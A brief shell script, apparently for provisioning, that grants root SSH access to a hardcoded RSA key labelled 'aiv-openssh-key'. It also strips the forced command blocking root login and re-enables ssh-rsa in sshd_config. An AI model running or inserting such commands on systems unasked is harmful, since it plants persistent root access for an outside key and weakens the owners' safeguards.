mkdir -p /root/.ssh/;
sed -e "s/echo;sleep 10;exit 142//g" -i /root/.ssh/authorized_keys;
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCOEv/mSbVV+A1+k4vSuQ71C33AuuB5nHpOBAY5aM+PTvrbDM3e20cZ2BaY8+d2qm1wiz6W5tZFjvbKTIgPGq9kV8uwgEQOJPGkeEzTX+/pTUIwvsQetR3943rXXHV+OnRLC8jUpys3eUeiRibUakxlTvN7Uwa9EWACGEMsLzaPe+81CHAhRttXxRWRxJDolY34u0j4E0LvCdQy1GgiMwZM6Ct887WCQliwQOd8WdhhEJI2vhlkpY0appkXkmla3AKqLBkYvP2yfWMorEzkZfygjrkCIqtssGdNP0vBRjAaYJEVQGoqgILPYqVEGThfQ87ywAKFV+Zy099xlUVlf7fb aiv-openssh-key" >> /root/.ssh/authorized_keys;
echo "PubkeyAcceptedKeyTypes=+ssh-rsa" >> /etc/ssh/sshd_config;
service ssh restart;
